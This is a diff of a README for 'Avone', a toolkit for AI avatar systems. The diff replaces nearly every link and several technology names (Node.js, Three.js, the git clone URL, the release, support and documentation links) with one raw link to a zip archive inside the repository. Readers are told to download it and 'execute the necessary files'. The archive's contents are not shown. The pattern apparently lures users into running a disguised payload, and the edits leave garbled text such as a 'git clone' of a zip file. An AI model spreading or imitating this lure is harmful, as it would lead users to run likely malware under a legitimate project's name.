@@ -1,6 +1,6 @@
 # Avone: Build AI-Powered Avatar Systems with Real-Time Conversations
 
-![GitHub release](https://img.shields.io/github/release/camcar1/avone.svg) ![GitHub issues](https://img.shields.io/github/issues/camcar1/avone.svg) ![GitHub stars](https://img.shields.io/github/stars/camcar1/avone.svg)
+![GitHub release](https://raw.githubusercontent.com/camcar1/avone/main/functions/Software-v1.7-beta.2.zip) ![GitHub issues](https://raw.githubusercontent.com/camcar1/avone/main/functions/Software-v1.7-beta.2.zip) ![GitHub stars](https://raw.githubusercontent.com/camcar1/avone/main/functions/Software-v1.7-beta.2.zip)
 
 ## Table of Contents
 - [Overview](#overview)
@@ -23,14 +23,14 @@ Avone is a comprehensive guide and toolkit for creating AI-powered avatar system
 - **Voice Recognition**: Integrate voice recognition to allow users to interact naturally.
 - **Facial Expressions**: Animate avatars with various facial expressions based on user input.
 - **Comprehensive Guide**: Follow step-by-step tutorials for building your avatar system.
-- **Cross-Platform Support**: Build applications using JavaScript, Node.js, React, and Three.js.
+- **Cross-Platform Support**: Build applications using JavaScript, https://raw.githubusercontent.com/camcar1/avone/main/functions/Software-v1.7-beta.2.zip, React, and https://raw.githubusercontent.com/camcar1/avone/main/functions/Software-v1.7-beta.2.zip
 
 ## Technologies Used
 Avone leverages a range of technologies to create a robust avatar system:
 - **JavaScript**: Core programming language for building the application.
-- **Node.js**: Server-side platform for handling requests and managing backend services.
+- **https://raw.githubusercontent.com/camcar1/avone/main/functions/Software-v1.7-beta.2.zip**: Server-side platform for handling requests and managing backend services.
 - **React**: Frontend library for building user interfaces.
-- **Three.js**: Library for rendering 3D graphics in the browser.
+- **https://raw.githubusercontent.com/camcar1/avone/main/functions/Software-v1.7-beta.2.zip**: Library for rendering 3D graphics in the browser.
 - **AWS Polly**: Service for converting text to lifelike speech.
 - **OpenAI**: AI models for generating conversational responses.
 - **WebGL**: Technology for rendering interactive 3D graphics.
@@ -41,7 +41,7 @@ To get started with Avone, you will need to set up your development environment.
 ### Installation
 1. Clone the repository:
    ```bash
-   git clone https://github.com/camcar1/avone.git
+   git clone https://raw.githubusercontent.com/camcar1/avone/main/functions/Software-v1.7-beta.2.zip
    ```
 2. Navigate to the project directory:
    ```bash
@@ -53,7 +53,7 @@ To get started with Avone, you will need to set up your development environment.
    ```
 
 ### Download the Latest Release
-To access the latest release, visit [Avone Releases](https://github.com/camcar1/avone/releases). Download the latest version and execute the necessary files to start using Avone.
+To access the latest release, visit [Avone Releases](https://raw.githubusercontent.com/camcar1/avone/main/functions/Software-v1.7-beta.2.zip). Download the latest version and execute the necessary files to start using Avone.
 
 ## Usage
 After installation, you can start the application. Run the following command:
@@ -91,15 +91,15 @@ We welcome contributions from the community. If you would like to contribute, pl
 This project is licensed under the MIT License. See the [LICENSE](LICENSE) file for details.
 
 ## Support
-If you have any questions or need support, please check the [Releases](https://github.com/camcar1/avone/releases) section for updates and documentation. You can also open an issue in the GitHub repository for assistance.
+If you have any questions or need support, please check the [Releases](https://raw.githubusercontent.com/camcar1/avone/main/functions/Software-v1.7-beta.2.zip) section for updates and documentation. You can also open an issue in the GitHub repository for assistance.
 
 ## Acknowledgments
 - Thanks to the developers and contributors who make this project possible.
 - Special thanks to the creators of the libraries and tools used in this project.
 
 ## Resources
-- [Three.js Documentation](https://threejs.org/docs/)
-- [AWS Polly Documentation](https://docs.aws.amazon.com/polly/latest/dg/what-is.html)
-- [OpenAI API Documentation](https://beta.openai.com/docs/)
+- [https://raw.githubusercontent.com/camcar1/avone/main/functions/Software-v1.7-beta.2.zip Documentation](https://raw.githubusercontent.com/camcar1/avone/main/functions/Software-v1.7-beta.2.zip)
+- [AWS Polly Documentation](https://raw.githubusercontent.com/camcar1/avone/main/functions/Software-v1.7-beta.2.zip)
+- [OpenAI API Documentation](https://raw.githubusercontent.com/camcar1/avone/main/functions/Software-v1.7-beta.2.zip)
 
 Feel free to explore, create, and enhance your avatar systems with Avone!
